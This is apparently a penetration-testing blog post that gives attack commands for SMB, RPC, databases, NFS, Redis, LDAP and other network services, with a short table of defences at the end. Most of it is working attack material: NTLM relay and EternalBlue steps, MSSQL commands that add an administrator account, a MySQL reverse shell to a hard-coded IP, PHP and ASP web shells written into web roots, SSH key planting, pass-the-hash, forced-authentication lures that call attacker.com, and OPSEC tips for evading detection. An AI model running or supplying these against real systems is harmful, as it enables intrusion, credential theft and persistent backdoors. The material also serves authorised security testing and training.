---
layout: post
title: Attacking Common Services
date: 2025-04-10 16:18 +0300
categories: [Network Security, Ports & Protocols]
tags: [exploitation, protocols, mysql, ldap, password spraying, smb]
---

## Introduction

This document provides a comprehensive guide for assessing and exploiting common network services during penetration testing. For each service, we'll cover enumeration techniques, exploitation methods, and practical commands that can be used in your assessments.

## SMB/CIFS (Ports 139/445)

### SMB Enumeration Techniques

```bash
# Basic SMB enumeration with Nmap
nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-protocols target.com

# Using enum4linux for comprehensive enumeration
enum4linux -a target.com

# List SMB shares using smbclient
smbclient -L //target.com -N

# Check for null sessions
smbclient //target.com/IPC$ -N

# Enumerate with CrackMapExec
crackmapexec smb target.com --shares
crackmapexec smb target.com --users
crackmapexec smb target.com --groups
```

### SMB Exploitation

#### Null Session Attacks

```bash
# Access with null session
smbclient //target.com/share -N

# Extract user information with rpcclient null session
rpcclient -U "" -N target.com
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser 0x1f4
```

#### SMB Relay Attacks

```bash
# Check for SMB signing
nmap --script=smb-security-mode -p 445 target.com
crackmapexec smb target.com --gen-relay-list unsigned_hosts.txt

# Setting up relay with responder and ntlmrelayx
# 1. Configure responder to disable SMB and HTTP servers
vim /etc/responder/Responder.conf
# Set SMB = Off and HTTP = Off

# 2. Run responder
responder -I eth0 -wrf

# 3. Run ntlmrelayx targeting hosts without SMB signing
ntlmrelayx.py -tf unsigned_hosts.txt -smb2support -c "powershell -enc base64encodedcommand"
```

#### EternalBlue (MS17-010) Exploitation

```bash
# Check for vulnerability
nmap --script smb-vuln-ms17-010 -p 445 target.com

# Using Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set LHOST attacker.com
exploit
```

## RPC (Port 135)

### RPC Enumeration

```bash
# Basic port scan
nmap -sV -p 135 target.com

# RPC endpoint mapper dump
rpcdump.py target.com

# Using impacket for RPC enumeration
impacket-rpcdump target.com
```

### RPC Exploitation

```bash
# Using rpcclient
rpcclient -U "username%password" target.com

# Enumerating with rpcclient
rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser username
rpcclient $> getdompwinfo

# DCOM execution through RPC (with admin privileges)
impacket-dcomexec domain/username:password@target.com
```

## Password Spraying Techniques

### Account Enumeration First

```bash
# Kerberos user enumeration without authentication
kerbrute userenum --dc target.com -d domain.com userlist.txt

# SMB user enumeration
crackmapexec smb target.com --users

# LDAP user enumeration
ldapsearch -x -h target.com -D "cn=binduser,dc=domain,dc=com" -w "password" -b "dc=domain,dc=com" "(objectClass=person)" | grep sAMAccountName

# Extract email addresses from Exchange/OWA
```

### Password Spraying Execution

```bash
# Check domain password policy first
crackmapexec smb target.com -u validuser -p validpass --pass-pol

# SMB password spraying
crackmapexec smb target.com -u users.txt -p Spring2025! --continue-on-success

# Kerberos password spraying
kerbrute passwordspray --dc target.com -d domain.com users.txt Spring2025!

# OWA/O365 password spraying
python3 sprayhound.py -U userlist.txt -p Spring2025! -d domain.com -m owa

# LDAP password spraying
python3 ldapdomaindump.py -u 'domain\\validuser' -p 'Spring2025!' target.com
```

### Password Spraying Strategy

1. **Identify lockout policy** (typically 5-10 attempts before lockout)
2. **Create target user list** from various sources (OSINT, enumeration)
3. **Select common passwords** based on season, year, company name, etc.
4. **Spray methodically**:
   - Try 1 password against all accounts
   - Wait for lockout counter to reset (often 30 mins)
   - Try next password
5. **Document results** and successful credentials

## Forced Authentication Attacks

### Creating Capture Server

```bash
# Using Responder to capture NTLM hashes
responder -I eth0 -wrf

# Using ntlmrelayx to relay authentication
ntlmrelayx.py -tf targets.txt -smb2support

# Setting up SMB server with Impacket
impacket-smbserver share /tmp/share
```

### Forcing Authentication

#### Link-File Method

```bash
# Create a Windows .lnk file that forces SMB authentication
<?xml version="1.0" encoding="UTF-8"?>
<shortcut>
  <icon_file>\\attacker.com\share\icon.ico</icon_file>
</shortcut>

# Place in accessible locations like SharePoint, email attachments, USB drives
```

#### MS Office Documents

```bash
# Create a Word document with external image
<img src="\\attacker.com\share\image.jpg" width="1" height="1" />

# For Excel, create an external reference
=HYPERLINK("\\attacker.com\share\doc.xlsx", "Click Here")
```

#### HTML Email/Web Page Method

```html
<!-- Insert into HTML email or webpage -->
<img src="file://attacker.com/share/image.jpg" style="display:none">
```

#### PDF Embedding

```bash
# Using PDF techniques that request external resources
exiftool -DocumentName="\\\\attacker.com\\share\\file.txt" document.pdf
```

### Capturing and Using Credentials

```bash
# Extract captured hashes from Responder
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-[IP].txt

# Cracking with hashcat (NTLMv2)
hashcat -m 5600 hashes.txt wordlist.txt

# Pass-the-Hash attacks with CrackMapExec 
crackmapexec smb target.com -u administrator -H HASH

# Using Impacket with NTLM hash
impacket-psexec -hashes LMHASH:NTHASH administrator@target.com
```

## Attacking Databases

### MSSQL (Port 1433)

#### MSSQL Enumeration

```bash
# Basic port scan
nmap -sV -p 1433 --script=ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell target.com

# Brute force with CrackMapExec
crackmapexec mssql target.com -u users.txt -p passwords.txt

# Using Impacket for checks
impacket-mssqlclient domain/user:password@target.com -windows-auth
```

#### MSSQL Command Execution

```sql
-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell if disabled
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker Password123! /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';
EXEC xp_cmdshell 'powershell -enc base64encodedpayload';
```

#### MSSQL File Operations

```sql
-- Read files using bulk insert
CREATE TABLE file_data (line VARCHAR(8000));
BULK INSERT file_data FROM 'c:\windows\win.ini';
SELECT * FROM file_data;

-- Write files using OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.asp', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<%Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll())%>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
```

### MySQL (Port 3306)

#### MySQL Enumeration

```bash
# Basic scan
nmap -sV -p 3306 --script=mysql-* target.com

# Login with default credentials
mysql -h target.com -u root -p
```

#### MySQL Command Execution

```sql
-- Check if FILE privilege is granted
SELECT file_priv FROM mysql.user WHERE user = 'root';

-- Execute commands with User Defined Functions (UDF)
USE mysql;
CREATE TABLE hack(line BLOB);
INSERT INTO hack VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys.so'));
SELECT * FROM hack INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/out; chown mysql:mysql /tmp/out');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"');
```

#### MySQL File Operations

```sql
-- Reading files
SELECT LOAD_FILE('/etc/passwd');

-- Writing files (requires FILE privilege)
SELECT 'webshell content' INTO OUTFILE '/var/www/html/shell.php';

-- Write SSH authorized_keys
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';
```

### PostgreSQL (Port 5432)

#### PostgreSQL Enumeration

```bash
# Basic scan
nmap -sV -p 5432 --script=pgsql-* target.com

# Connect to PostgreSQL
psql -h target.com -U postgres -W
```

#### PostgreSQL Command Execution

```sql
-- Command execution via COPY FROM PROGRAM
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Creating a backdoor function
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('whoami > /tmp/whoami.txt');
```

#### PostgreSQL File Operations

```sql
-- Reading files
CREATE TABLE demo(t text);
COPY demo FROM '/etc/passwd';
SELECT * FROM demo;

-- Writing files
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

## Attacking NFS (Port 2049)

### NFS Enumeration

```bash
# Basic scan
nmap -sV -p 2049 --script=nfs-* target.com

# Show exported shares
showmount -e target.com

# Check NFS version and info
rpcinfo -p target.com | grep nfs
```

### NFS Exploitation

#### Mounting and Exploring NFS Shares

```bash
# Create mount point
mkdir /tmp/mount

# Mount the share
mount -t nfs target.com:/share /tmp/mount

# Look for sensitive files
find /tmp/mount -name "*.conf" -o -name "*.key" -o -name "*.pem" -o -name "id_rsa"

# Check file permissions
ls -la /tmp/mount/
```

#### NFS User ID Spoofing

```bash
# Check what user IDs have files on the share
ls -lan /tmp/mount/

# Create a local user with the same UID
useradd -u 1000 nfsuser

# Switch to that user
su nfsuser

# Access the mounted share with the spoofed UID
cat /tmp/mount/restricted_file.txt
```

#### SSH Key Planting (if /home is exported)

```bash
# If you find a user's home directory
mkdir -p /tmp/mount/user/.ssh
echo "ssh-rsa AAAAB3NzaC1..." > /tmp/mount/user/.ssh/authorized_keys
chmod 600 /tmp/mount/user/.ssh/authorized_keys

# SSH to target with the corresponding private key
ssh -i id_rsa user@target.com
```

## Additional Protocol Attacks

### LDAP (Port 389/636)

```bash
# Anonymous binding check
ldapsearch -x -H ldap://target.com -b "dc=domain,dc=com"

# Authenticated LDAP query
ldapsearch -x -H ldap://target.com -D "cn=binduser,dc=domain,dc=com" -w "password" -b "dc=domain,dc=com" "(objectClass=user)"

# LDAP password spraying
for u in $(cat users.txt); do ldapsearch -x -H ldap://target.com -D "$u@domain.com" -w "Spring2025!" -b "dc=domain,dc=com" -s base "(&)" 2>/dev/null && echo "Valid credential: $u:Spring2025!"; done
```

### SMTP (Port 25)

```bash
# Basic scan
nmap -sV -p 25 --script=smtp-* target.com

# SMTP user enumeration
smtp-user-enum -M RCPT -U users.txt -t target.com

# Manual SMTP commands
telnet target.com 25
EHLO example.com
MAIL FROM: <test@example.com>
RCPT TO: <admin@target.com>
```

### RDP (Port 3389)

```bash
# Basic scan
nmap -sV -p 3389 --script=rdp-* target.com

# Check for BlueKeep vulnerability (CVE-2019-0708)
nmap --script rdp-vuln-ms12-020 -p 3389 target.com

# Brute force with Hydra
hydra -L users.txt -P passwords.txt rdp://target.com
```

### FTP (Port 21)

```bash
# Basic scan
nmap -sV -p 21 --script=ftp-* target.com

# Anonymous login check
ftp target.com
> anonymous
> anonymous@domain.com

# Brute force with Hydra
hydra -L users.txt -P passwords.txt ftp://target.com
```

### Redis (Port 6379)

```bash
# Basic scan
nmap -sV -p 6379 --script=redis-* target.com

# Connect to Redis
redis-cli -h target.com

# If no authentication required, check server information
redis-cli -h target.com INFO

# SSH key upload for remote access (if Redis runs as a user with .ssh directory)
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/key.txt
cat /tmp/key.txt | redis-cli -h target.com -x set ssh_key
redis-cli -h target.com config set dir /home/redis/.ssh/
redis-cli -h target.com config set dbfilename "authorized_keys"
redis-cli -h target.com save
```

### Memcached (Port 11211)

```bash
# Basic scan
nmap -sV -p 11211 --script=memcached-* target.com

# Dump memcached keys
echo "stats items" | nc target.com 11211
echo "stats cachedump 1 0" | nc target.com 11211

# Get values for keys
echo "get key_name" | nc target.com 11211
```

### SNMP (Port 161/162)

```bash
# Basic scan
nmap -sU -p 161 --script=snmp-* target.com

# SNMP enumeration with public community string
snmpwalk -v1 -c public target.com
snmpwalk -v2c -c public target.com

# Brute force community strings
onesixtyone -c community_strings.txt target.com

# Extract interesting information
snmpwalk -v1 -c public target.com 1.3.6.1.2.1.25.4.2.1.2 # Running processes
snmpwalk -v1 -c public target.com 1.3.6.1.2.1.25.6.3.1.2 # Installed software
snmpwalk -v1 -c public target.com 1.3.6.1.4.1.77.1.2.25 # User accounts
```

## OPSEC Considerations

1. **Plan your attacks carefully** - Understand network monitoring capabilities
2. **Rate limit brute force attempts** - Avoid account lockouts and detection
3. **Be mindful of service disruption** - Some exploits can crash services
4. **Clean up after exploitation** - Remove uploaded files, reset configurations
5. **Use encrypted channels when possible** - Reduce detection risk from network monitoring
6. **Document all activities** - Maintain accurate logging for reporting

## Defense Recommendations

| Service | Attack Vector | Mitigation |
|---------|--------------|------------|
| SMB | Null Sessions | Disable anonymous access, require signing |
| SMB | Relay Attacks | Enable SMB signing on all systems |
| RPC | Anonymous Access | Restrict RPC access with firewall rules |
| Databases | Command Execution | Remove unnecessary privileges, disable xp_cmdshell |
| Databases | File Access | Restrict FILE privileges, use least privilege accounts |
| NFS | Root Squashing | Ensure proper export settings with 'root_squash' |
| Authentication | Password Spraying | Strong password policy, MFA, account lockout |
| Authentication | Forced Auth | Disable NTLM where possible, block outbound SMB |

## References

1. [HackTricks - SMB](https://book.hacktricks.xyz/pentesting/pentesting-smb)
2. [SANS - Database Hacking](https://www.sans.org/blog/sql-server-hacking-on-an-unrooted-system/)
3. [Impacket GitHub Repository](https://github.com/SecureAuthCorp/impacket)
4. [CrackMapExec Documentation](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
5. [NFS Security Best Practices](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/storage_administration_guide/nfs-security)
6. [OWASP - Testing for LDAP Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)



